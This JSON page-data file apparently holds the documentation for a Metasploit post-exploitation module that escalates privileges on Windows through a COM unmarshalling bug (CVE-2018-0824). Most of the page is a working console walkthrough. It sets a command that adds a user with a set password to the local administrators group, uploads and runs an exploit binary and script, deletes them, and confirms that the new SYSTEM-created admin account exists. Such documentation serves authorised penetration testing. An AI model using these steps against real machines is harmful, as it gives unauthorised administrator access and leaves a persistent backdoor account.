{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/escalate/unmarshal_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"77523896-30fd-5905-b50c-5593426ea08e","name":"Windows unmarshal post exploitation","fullname":"post/windows/escalate/unmarshal_cmd_exec","description":"This module exploits a local privilege escalation bug which exists\n        in microsoft COM for windows when it fails to properly handle serialized objects.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/escalate/unmarshal_cmd_exec","documentationSlug":"/modules/documentation/post/windows/escalate/unmarshal_cmd_exec","referencesSlug":"/modules/references/post/windows/escalate/unmarshal_cmd_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This is a post exploitation module for local privilege escalation bug\nwhich exists in Microsoft COM for windows when it fails to properly\nhandle serialized objects.</p>\n<ul>\n<li><a href=\"https://www.phpmyadmin.net/downloads/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.phpmyadmin.net/downloads/</a></li>\n<li><a href=\"https://github.com/codewhitesec/UnmarshalPwn/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/codewhitesec/UnmarshalPwn/</a></li>\n<li><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824</a></li>\n</ul>\n<h3 id=\"limitations\" style=\"position:relative;\"><a href=\"#limitations\" aria-label=\"limitations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Limitations</h3>\n<p>The payload will not spawn ant independent session it simply creates process with the system privilege.\nIf the system is not vulnerable, then payload will execute but new process will not spawn.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>If you want to confirm the vulnerability before you add user or perform any other sensitive action.</p>\n<ol>\n<li><code class=\"language-text\">set COMMAND /s notepad.exe</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<p>Confirmation:</p>\n<p>Then go to meterpreter session and confirm running process (ps)\nIf you see notepad.exe running as SYSYEM then that is as indication of vulnerable system.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"command\" style=\"position:relative;\"><a href=\"#command\" aria-label=\"command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>COMMAND</h3>\n<p>This command will be executed on successful escalation.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-10-build-15063\" style=\"position:relative;\"><a href=\"#windows-10-build-15063\" aria-label=\"windows 10 build 15063 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 10 (Build 15063)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer        : WIN10X64-1703\nOS              : Windows 10 (Build 15063).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; execute -f cmd.exe -i -H\nProcess 4868 created.\nChannel 7 created.\nMicrosoft Windows [Version 10.0.15063]\n(c) 2017 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\msfuser\\Downloads&gt;net user\nnet user\n\nUser accounts for \\\\WIN10X64-1703\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest                    \nmsfuser                  \nThe command completed successfully.\n\n\nC:\\Users\\msfuser\\Downloads&gt;exit           \nexit\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 post(windows/escalate/unmarshal_cmd_exec) &gt; show options\n\nModule options (post/windows/escalate/unmarshal_cmd_exec):\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   COMMAND                        no        The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% &amp; net localgroup administrators /add &lt;user&gt;).\n   EXPLOIT_NAME                   no        The filename to use for the exploit binary (%RAND% by default).\n   PATH                           no        Path to write binaries (%TEMP% by default).\n   SCRIPT_NAME                    no        The filename to use for the COM script file (%RAND% by default).\n   SESSION                        yes       The session to run this module on.\n\nmsf5 post(windows/escalate/unmarshal_cmd_exec) &gt; set command &#39;net user /add egypt h@ks4shellz  &amp; net localgroup administrators /add egypt&#39;\ncommand =&gt; net user /add egypt h@ks4shellz  &amp; net localgroup administrators /add egypt\nmsf5 post(windows/escalate/unmarshal_cmd_exec) &gt; set verbose true\nverbose =&gt; true\nmsf5 post(windows/escalate/unmarshal_cmd_exec) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Attempting to PrivEsc on WIN10X64-1703 via session ID: 1\n[*] exploit path is: C:\\Users\\msfuser\\AppData\\Local\\Temp\\hylZVjgbLrd.exe\n[*] script path is: C:\\Users\\msfuser\\AppData\\Local\\Temp\\NCYcABO.sct\n[*] command is: net user /add egypt h@ks4shellz  &amp; net localgroup administrators /add egypt\n[*] Attempting to PrivEsc on WIN10X64-1703 via session ID: 1\n[*] Uploading Script to C:\\Users\\msfuser\\AppData\\Local\\Temp\\NCYcABO.sct\n[*] Creating the sct file with command net user /add egypt h@ks4shellz  &amp; net localgroup administrators /add egypt\n[*] script_template_data.length =  306\n[*] Writing 376 bytes to C:\\Users\\msfuser\\AppData\\Local\\Temp\\NCYcABO.sct to target\n[*] Script uploaded successfully\n[*] Uploading Exploit to C:\\Users\\msfuser\\AppData\\Local\\Temp\\hylZVjgbLrd.exe\n[*] Exploit uploaded on WIN10X64-1703 to C:\\Users\\msfuser\\AppData\\Local\\Temp\\hylZVjgbLrd.exe\n[*] Launching Exploit...\n[*] Query for IStorage\nCall:  Stat\nEnd:  Stat\nQuery for IMarshal\nCall:  GetMarshalSizeMax\nUnknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 0000017F6C3E05B0\nQuery for IMarshal\nCall:  GetUnmarshalClass\nCall:  GetMarshalSizeMax\nCall:  MarshalInterface\n[+] Exploit Completed\n[*] C:\\Users\\msfuser\\AppData\\Local\\Temp\\hylZVjgbLrd.exe already exists on the target. Deleting...\n[*] Deleted C:\\Users\\msfuser\\AppData\\Local\\Temp\\hylZVjgbLrd.exe\n[*] C:\\Users\\msfuser\\AppData\\Local\\Temp\\NCYcABO.sct already exists on the target. Deleting...\n[*] Deleted C:\\Users\\msfuser\\AppData\\Local\\Temp\\NCYcABO.sct\n[*] Post module execution completed\nmsf5 post(windows/escalate/unmarshal_cmd_exec) &gt; sessions -i -1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; execute -f cmd.exe -i -H\nProcess 1780 created.\nChannel 11 created.\nMicrosoft Windows [Version 10.0.15063]\n(c) 2017 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\msfuser\\Downloads&gt;net user \nnet user\n\nUser accounts for \\\\WIN10X64-1703\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           egypt                    \nGuest                    msfuser                  \nThe command completed successfully.\n\n\nC:\\Users\\msfuser\\Downloads&gt;net localgroup administrators\nnet localgroup administrators\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\negypt\nmsfuser\nThe command completed successfully.\n\n\nC:\\Users\\msfuser\\Downloads&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"77523896-30fd-5905-b50c-5593426ea08e"}}}